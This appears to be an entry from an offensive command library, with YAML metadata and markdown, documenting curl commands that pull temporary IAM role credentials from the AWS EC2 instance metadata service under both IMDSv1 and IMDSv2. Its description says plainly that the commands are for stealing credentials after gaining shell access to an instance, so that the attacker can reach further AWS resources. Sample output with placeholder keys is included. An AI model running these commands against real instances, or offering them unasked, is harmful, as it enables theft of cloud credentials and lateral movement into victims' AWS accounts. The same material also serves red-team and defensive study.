---
id: b6eafe27-01db-4578-afb4-bc4ecd3b8a09
name: curl-retrieve-ec2-security-credentials
type: command
executor: bash
data: >-
  curl -H "X-aws-ec2-metadata-token: $TOKEN"
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
output: null
created_at: '2023-04-06T03:56:13.342352+00:00'
updated_at: '2023-04-10T20:20:07.343174+00:00'
platforms:
  - AWS
  - Linux
tags:
  - aws
  - metadata
  - credentials
verified: true
validated: true
---

# curl-retrieve-ec2-security-credentials

## Command

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
```

## Description

This command queries the AWS EC2 Instance Metadata Service (IMDS) to retrieve temporary IAM role credentials for the instance. Use it after gaining shell access to an EC2 instance to steal credentials for further AWS resource access. For IMDSv1 (less secure), omit the header; for IMDSv2, include the session token obtained via a prior PUT request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-aws-ec2-metadata-token: $TOKEN"` | Header with IMDSv2 session token (variable $TOKEN from prior command) | Yes for IMDSv2; No for IMDSv1 |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance` | Endpoint path; replace 'ec2-instance' with the actual IAM role name | Yes |

## Examples

### Basic Usage (IMDSv1)

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
```

### Advanced Usage (IMDSv2 with Token)

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
```

## Expected Output

Successful execution returns JSON with temporary credentials:

```json
{
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjMmN... (long token string)",
  "Expiration" : "2023-04-10T10:00:00Z"
}
```

If no IAM role is attached, expect a 404 response. For invalid tokens, a 401 Unauthorized error occurs.

## Related

- [[procedures/Retrieve-AWS-EC2-Instance-Credentials-via-Metadata-Service]]
